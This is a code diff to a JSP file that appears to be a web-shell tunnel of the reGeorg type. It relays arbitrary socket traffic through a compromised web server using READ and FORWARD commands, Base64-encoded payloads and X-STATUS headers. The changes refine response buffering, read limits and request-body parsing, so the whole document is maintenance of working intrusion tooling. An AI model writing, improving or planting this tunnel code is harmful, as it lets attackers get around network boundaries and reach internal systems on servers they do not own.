@@ -1,4 +1,4 @@
-<%@page import="java.nio.ByteBuffer, java.nio.channels.SocketChannel, java.io.*, java.net.*, java.util.*" pageEncoding="utf-8" trimDirectiveWhitespaces="true"%>
+<%@page import="java.nio.ByteBuffer, java.nio.channels.SocketChannel, java.io.*, java.net.*, java.util.*" pageEncoding="UTF-8" trimDirectiveWhitespaces="true"%>
 <%!
     private static char[] en = "BASE64 CHARSLIST".toCharArray();
     public static String b64en(byte[] data) {
@@ -150,9 +150,7 @@
             }
 
             for (String key : conn.getHeaderFields().keySet()) {
-                // Solve the jdk low version conn.getHeaderFields()
-                // Solve the problem of weblogic blank line cannot remove
-                if (key != null && !key.equalsIgnoreCase("Content-Length")){
+                if (key != null && !key.equalsIgnoreCase("Content-Length") && !key.equalsIgnoreCase("Transfer-Encoding")){
                     String value = conn.getHeaderField(key);
                     response.setHeader(key, value);
                 }
@@ -169,13 +167,17 @@
                 }
             }
 
-            response.setStatus(conn.getResponseCode());
-
+            ByteArrayOutputStream baos = new ByteArrayOutputStream();
             while ((i = hin.read(buffer)) != -1) {
                 byte[] data = new byte[i];
                 System.arraycopy(buffer, 0, data, 0, i);
-                out.write(new String(data));
+                baos.write(data);
             }
+            String responseBody = new String(baos.toByteArray());
+            response.addHeader("Content-Length", Integer.toString(responseBody.length()));
+            response.setStatus(conn.getResponseCode());
+            out.write(responseBody);
+            out.flush();
 
             if ( true ) return; // exit
         }
@@ -212,12 +214,19 @@
         } else if (cmd.compareTo("READ") == 0){
             SocketChannel socketChannel = (SocketChannel)application.getAttribute(mark);
             try{
-                ByteBuffer buf = ByteBuffer.allocate(513);
+                ByteBuffer buf = ByteBuffer.allocate(READBUF);
                 int bytesRead = socketChannel.read(buf);
+                int maxRead = MAXREADSIZE;
+                int readLen = 0;
                 while (bytesRead > 0){
                     byte[] data = new byte[bytesRead];
                     System.arraycopy(buf.array(), 0, data, 0, bytesRead);
                     out.write(b64en(data));
+                    out.flush();
+                    ((java.nio.Buffer)buf).clear();
+                    readLen += bytesRead;
+                    if (bytesRead < READBUF || readLen >= maxRead)
+                        break;
                     bytesRead = socketChannel.read(buf);
                 }
                 response.setHeader("X-STATUS", "OK");
@@ -229,12 +238,15 @@
         } else if (cmd.compareTo("FORWARD") == 0){
             SocketChannel socketChannel = (SocketChannel)application.getAttribute(mark);
             try {
-
-                int readlen = request.getContentLength();
-                byte[] buff = new byte[readlen];
-
-                request.getInputStream().read(buff, 0, readlen);
-                byte[] base64 = b64de(new String(buff));
+                String inputData = "";
+                InputStream in = request.getInputStream();
+                while ( true ){
+                    byte[] buff = new byte[in.available()];
+                    if (in.read(buff) == -1)
+                        break;
+                    inputData += new String(buff);
+                }
+                byte[] base64 = b64de(inputData);
                 ByteBuffer buf = ByteBuffer.allocate(base64.length);
                 buf.put(base64);
                 buf.flip();
